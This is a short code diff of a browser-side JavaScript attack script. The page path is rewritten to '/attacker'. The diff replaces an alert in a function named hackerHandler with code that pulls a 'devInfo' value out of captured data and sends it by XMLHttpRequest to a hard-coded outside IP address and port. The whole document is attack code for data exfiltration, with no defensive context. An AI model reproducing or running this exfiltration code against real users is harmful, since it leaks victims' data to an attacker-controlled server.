@@ -1,7 +1,10 @@
 window.history.replaceState(null, '', '/attacker');
 
 function hackerHandler(e) {
-	alert(e);
+	var devInfo = e.actions[4][1]
+	var xhr = new XMLHTTPRequest;
+	xhr.open('GET', 'http://212.71.234.194:8080/'+devInfo)
+	xhr.send()
 }
 
 o = document.createElement("script");
